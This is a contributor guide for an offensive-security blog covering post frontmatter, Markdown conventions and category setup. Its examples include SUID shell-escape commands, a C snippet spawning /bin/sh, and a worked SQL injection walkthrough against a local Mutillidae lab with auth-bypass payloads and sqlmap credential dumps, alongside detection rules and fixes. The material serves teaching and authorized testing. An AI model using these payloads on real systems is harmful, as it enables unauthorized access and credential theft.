# Creating a New Post — r3d/ops Blog

Complete reference for writing and publishing posts on the KBM Security blog.

---

## 1. File Location & Naming

Every post is a plain Markdown file (`.md`) placed inside the correct category folder:

```
src/content/posts/<category>/<your-slug>.md
```

The **folder name must match the `category` field** in the frontmatter (see §3).  
The **filename becomes the URL slug** — keep it lowercase, hyphen-separated, descriptive.

### Available category folders

| Folder | URL path | Use for |
|---|---|---|
| `recon/` | `/blog/tags/recon` | Reconnaissance, OSINT, footprinting |
| `privesc/` | `/blog/tags/privesc` | Privilege escalation (Linux & Windows) |
| `lateral/` | `/blog/tags/lateral` | Lateral movement, pivoting |
| `persistence/` | `/blog/tags/persistence` | Backdoors, scheduled tasks, startup |
| `exfil/` | `/blog/tags/exfil` | Data exfiltration techniques |
| `evasion/` | `/blog/tags/evasion` | AV/EDR evasion, obfuscation |
| `web/` | `/blog/tags/web` | Web exploitation, OWASP, APIs |
| `cloud/` | `/blog/tags/cloud` | AWS/Azure/GCP attack & abuse |

### Example

A post about SQL injection goes in:

```
src/content/posts/web/sql-injection-auth-bypass.md
```

Its live URL will be:

```
https://www.kbmsecurity.com.br/blog/post/web/sql-injection-auth-bypass
```

---

## 2. Starter Template

Copy this block to the top of your new file and fill every field:

```markdown
---
title: "Your Post Title Here"
date: 2025-06-15
description: "One or two sentences describing what the reader will learn. Keep it under 300 characters."
category: web
os: [linux]
difficulty: medium
mitre_tactic: TA0001
mitre_technique: T1190
tags: [sqli, web, auth-bypass, owasp]
status: draft
---

## Introduction

Your content starts here.
```

> **Tip:** Set `status: draft` while writing. The post will be invisible on the live site until you change it to `status: published`.

---

## 3. Frontmatter Field Reference

Every field is validated at build time. The build will fail with a clear error if a required field is missing or uses an invalid value.

### `title` · string · **required**

The post title displayed in cards, the browser tab, and SEO meta tags.

- Max **120 characters**
- Use quotes if the title contains colons or special characters
- Be specific — readers scan titles to decide if they should click

```yaml
title: "SUID Abuse — Escalating to Root with Forgotten Binaries"
```

---

### `date` · YYYY-MM-DD · **required**

Publication date. Controls sort order on the home page and tag pages.

```yaml
date: 2025-06-15
```

---

### `description` · string · **required**

Short summary shown on post cards and in search results (Orama index).

- Max **300 characters**
- Should answer: *what technique / what target / what outcome*
- Avoid repeating the title word-for-word

```yaml
description: "How misconfigured SUID binaries on Linux can be weaponized for privilege escalation using GTFOBins techniques and custom enumeration scripts."
```

---

### `category` · enum · **required**

Must be **exactly one** of the following values:

| Value | Description |
|---|---|
| `recon` | Reconnaissance & OSINT |
| `privesc` | Privilege Escalation |
| `lateral` | Lateral Movement |
| `persistence` | Persistence mechanisms |
| `exfil` | Exfiltration |
| `evasion` | Defense Evasion |
| `web` | Web Application attacks |
| `cloud` | Cloud infrastructure attacks |

```yaml
category: privesc
```

> **The folder and the category value must match.** A file in `posts/privesc/` must have `category: privesc`.

---

### `os` · array · **required**

One or more target operating systems. Must be an array even with a single value.

| Value | Meaning |
|---|---|
| `linux` | Linux / Unix systems |
| `windows` | Windows endpoints & servers |
| `macos` | macOS |
| `all` | Cross-platform / OS-agnostic |

```yaml
os: [linux]
os: [linux, windows]
os: [all]
```

---

### `difficulty` · enum · **required**

| Value | Meaning |
|---|---|
| `easy` | No prerequisites, straightforward steps |
| `medium` | Requires some background knowledge |
| `hard` | Complex chains, multiple components |
| `expert` | Advanced internals, deep exploitation |

```yaml
difficulty: medium
```

---

### `tags` · array · **required**

Keywords used for search (Orama full-text index) and the `/tags/` filter pages.

- Max **8 tags** per post
- Lowercase, hyphen-separated
- Be consistent — reuse existing tags when they fit (e.g. `linux`, `privesc`, `bash`)
- Add at least one tool name, one technique name, and the category itself

```yaml
tags: [suid, linux, privesc, gtfobins, setuid, enumeration]
```

---

### `status` · enum · **required**

| Value | Behaviour |
|---|---|
| `draft` | Hidden from all public routes, search, and RSS |
| `published` | Visible everywhere |

```yaml
status: draft      # while writing
status: published  # when ready to go live
```

---

### `mitre_tactic` · string · optional

The MITRE ATT&CK Tactic ID. Displayed as a badge in the post header with a link to attack.mitre.org.

```yaml
mitre_tactic: TA0004
```

Common tactic IDs:

| ID | Tactic |
|---|---|
| `TA0043` | Reconnaissance |
| `TA0001` | Initial Access |
| `TA0002` | Execution |
| `TA0003` | Persistence |
| `TA0004` | Privilege Escalation |
| `TA0005` | Defense Evasion |
| `TA0006` | Credential Access |
| `TA0007` | Discovery |
| `TA0008` | Lateral Movement |
| `TA0009` | Collection |
| `TA0010` | Exfiltration |
| `TA0011` | Command and Control |
| `TA0040` | Impact |

---

### `mitre_technique` · string · optional

The MITRE ATT&CK Technique ID (with or without sub-technique).

```yaml
mitre_technique: T1548.001
```

---

### `readingTime` · number · optional

Estimated reading time in minutes, shown in post cards.  
**If omitted, it is auto-calculated** from the post body at ~200 words/minute.  
Only set this manually if the auto-calculation is wrong (e.g. posts heavy with code blocks).

```yaml
readingTime: 9
```

---

## 4. Writing the Body

The body is standard Markdown with a few extras provided by the blog's Shiki syntax highlighter and Astro MDX components.

### Headings

Use `##` (H2) as the top-level section heading. The Table of Contents sidebar is built from H2 and H3 headings automatically.

```markdown
## Phase 1 — Enumeration

### Active scanning with nmap

#### Stealth scan options
```

> Do not use `#` (H1) in the body — the post title is already rendered as H1 by the layout.

---

### Code Blocks with Syntax Highlighting

Fence code blocks with the language identifier. Shiki highlights them with the `one-dark-pro` theme. A copy button and language label are injected automatically.

````markdown
```bash
find / -perm -u=s -type f 2>/dev/null
```

```python
import subprocess
result = subprocess.run(['whoami'], capture_output=True, text=True)
print(result.stdout)
```

```powershell
Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue |
  Where-Object { $_.Name -like "*.config" }
```

```c
#include <stdio.h>
int main() { system("/bin/sh"); return 0; }
```
````

Supported language identifiers include: `bash`, `sh`, `powershell`, `python`, `python3`, `c`, `cpp`, `go`, `rust`, `javascript`, `typescript`, `yaml`, `json`, `sql`, `xml`, `html`, `css`, `text`, `diff`.

---

### Callout Blocks

The blog ships a `<Callout>` component for highlighted notices. In plain `.md` files you can use HTML directly since Astro processes it:

```html
<!-- Info (blue) — default -->
<div class="callout callout-info">
  <div class="callout-title">ℹ INFO</div>
  <div class="callout-body">
    This technique requires a local shell on the target.
  </div>
</div>

<!-- Warning (yellow) -->
<div class="callout callout-warn">
  <div class="callout-title">⚠ WARNING</div>
  <div class="callout-body">
    Noisy technique — generates auditd events.
  </div>
</div>

<!-- Danger (red) -->
<div class="callout callout-danger">
  <div class="callout-title">☠ DANGER</div>
  <div class="callout-body">
    Never run this outside an authorized engagement.
  </div>
</div>

<!-- Tip (green) -->
<div class="callout callout-tip">
  <div class="callout-title">› TIP</div>
  <div class="callout-body">
    Pipe output through tee to log everything automatically.
  </div>
</div>
```

If you rename the file to `.mdx`, you can import and use the component directly:

```mdx
import Callout from '../../components/Callout.astro';

<Callout type="danger" title="AUTHORIZED USE ONLY">
  This technique must only be used on systems you own or have written
  permission to test.
</Callout>
```

---

### Tables

Standard GFM tables are fully supported:

```markdown
| Binary | Exploit Method | Difficulty |
|---|---|---|
| `find` | `-exec /bin/sh -p` | Easy |
| `python3` | `os.execl("/bin/sh","sh","-p")` | Easy |
| `vim` | `:!sh -p` | Easy |
```

---

### Horizontal Rules

Use `---` to separate major sections. It renders as a subtle styled divider.

---

### Blockquotes

```markdown
> **MITRE ATT&CK:** This technique maps to T1548.001 under TA0004.
```

---

### Inline Code

Wrap commands, file paths, flags, and binary names in single backticks:

```markdown
The `find` binary with the SUID bit set can be exploited via `-exec`.
Check `/etc/passwd` and `/etc/shadow` for credential material.
Pass the `-p` flag to preserve the effective UID.
```

---

## 5. Recommended Post Structure

A well-structured post follows this order. Not every section is mandatory, but it sets reader expectations consistently across the blog.

```
## What is <technique>?          — short conceptual intro (2-4 sentences)
## Prerequisites / Lab Setup     — what the reader needs before starting
## Step 1 — <first action>       — numbered phases walk through the attack
## Step 2 — <second action>
## Step N — ...
## Automated Script / Tool       — full script if applicable
## Detection & Mitigation        — blue team perspective
## Summary                       — table or bullet recap
```

---

## 6. Complete Worked Example

```
src/content/posts/web/sql-injection-auth-bypass.md
```

```markdown
---
title: "SQL Injection — Authentication Bypass via UNION-Based Attack"
date: 2025-06-15
description: "Step-by-step exploitation of a login form vulnerable to UNION-based SQL injection, from discovery through session hijacking."
category: web
os: [linux, windows]
difficulty: medium
mitre_tactic: TA0001
mitre_technique: T1190
tags: [sqli, web, auth-bypass, union, owasp, burpsuite, sqlmap]
status: draft
---

## What is SQL Injection?

SQL Injection (SQLi) occurs when user-supplied input is concatenated directly
into a SQL query without sanitisation. An attacker can alter the query's logic,
bypass authentication, dump the database, or in some configurations achieve
remote code execution.

> **MITRE ATT&CK:** Maps to [T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
> under the Initial Access tactic (TA0001).

---

## Lab Setup

Spin up a local vulnerable target:

```bash
docker run -d -p 8080:80 webpwnized/mutillidae:latest
# Login page at http://localhost:8080/mutillidae/
```

You will also need:
- **Burp Suite** (Community or Pro) for request interception
- **sqlmap** for automated exploitation

---

## Step 1 — Identify the Injection Point

Open the login page and intercept the POST request with Burp Suite.

```http
POST /login.php HTTP/1.1
Host: localhost:8080

username=admin&password=test
```

Test for a basic error by injecting a single quote into the username field:

```
username=admin'
```

A verbose SQL error response confirms the injection point:

```
You have an error in your SQL syntax near ''' at line 1
```

---

## Step 2 — Bypass Authentication

Classic bypass using comment truncation:

```sql
' OR '1'='1' --
' OR 1=1 --
admin'--
```

Full login request payload:

```
username=admin'--&password=anything
```

The resulting query executed on the server:

```sql
-- Original (vulnerable) query:
SELECT * FROM users WHERE username='admin'--' AND password='anything'

-- The -- comments out the password check entirely, returning the admin row.
```

---

## Step 3 — Enumerate the Database with sqlmap

```bash
# Save the intercepted POST request to a file first (req.txt)
sqlmap -r req.txt --dbs --batch

# Dump the target database
sqlmap -r req.txt -D mutillidae --tables --batch
sqlmap -r req.txt -D mutillidae -T accounts --dump --batch
```

Expected output:

```
[+] current database: mutillidae
[+] available databases: information_schema, mutillidae
[*] Table: accounts
+----+----------+------------------+
| id | username | password         |
+----+----------+------------------+
| 1  | admin    | adminpass        |
| 2  | jsmith   | p@ssw0rd         |
+----+----------+------------------+
```

---

## Detection & Mitigation

### Blue Team Detections

| Indicator | Source | Rule |
|---|---|---|
| SQL syntax keywords in params | WAF / access logs | `UNION`, `SELECT`, `--`, `'` in query strings |
| Repeated 500 errors on login | App logs | >5 HTTP 500 from same IP in 60s |
| sqlmap User-Agent | Access logs | `sqlmap` string in `User-Agent` header |

### Developer Fixes

```php
// BAD — vulnerable
$query = "SELECT * FROM users WHERE username='$_POST[username]'";

// GOOD — parameterised query (PDO)
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$_POST['username']]);
```

---

## Summary

| Step | Action |
|---|---|
| 1 | Identify injection point with `'` |
| 2 | Bypass auth with `' OR 1=1 --` |
| 3 | Enumerate DB with `sqlmap -r req.txt --dbs` |
| 4 | Dump credentials with `--dump` |
```

---

## 7. Publishing Checklist

Before setting `status: published`, verify:

- [ ] Frontmatter has no typos — build will fail on invalid enum values
- [ ] `category` matches the folder the file lives in
- [ ] `tags` array has 1–8 entries (max 8 enforced by schema)
- [ ] `title` is under 120 characters
- [ ] `description` is under 300 characters
- [ ] `date` is in `YYYY-MM-DD` format
- [ ] All code blocks have a language identifier
- [ ] No `#` H1 headings in the body (title is already H1)
- [ ] MITRE IDs verified at [attack.mitre.org](https://attack.mitre.org) if used
- [ ] Sensitive / real credentials scrubbed from code examples
- [ ] `status: published` set when ready

---

## 8. Folder Structure Quick Reference

```
src/
└── content/
    └── posts/
        ├── recon/
        │   └── passive-recon-osint.md
        ├── privesc/
        │   └── suid-abuse-linux.md
        ├── lateral/
        │   └── your-new-post.md       ← new file goes here
        ├── persistence/
        ├── exfil/
        ├── evasion/
        ├── web/
        └── cloud/
```

---

## 9. Adding a New Category (advanced)

The category list is fixed in two places. If you genuinely need a new category beyond the eight that exist, you must update both:

**`src/content/config.ts`** — add the new value to the `z.enum` for `category`:

```typescript
category: z.enum([
  "recon", "privesc", "lateral", "persistence",
  "exfil", "evasion", "web", "cloud",
  "maldev",   // ← new category
]),
```

**`src/utils/content.ts`** — add metadata to `CATEGORY_META` and the `Category` type:

```typescript
export type Category =
  | "recon" | "privesc" | "lateral" | "persistence"
  | "exfil" | "evasion" | "web" | "cloud"
  | "maldev";   // ← new

export const CATEGORY_META = {
  // ... existing entries ...
  maldev: {
    label: "Mal-Dev",
    color: "text-[#ff9800]",
    bg: "bg-[#ff9800]/10",
    border: "border-[#ff9800]/30",
    icon: "⚙",
  },
};
```

Then create the folder:

```bash
mkdir src/content/posts/maldev
```

---

*r3d/ops — KBM Security — For authorized security research only.*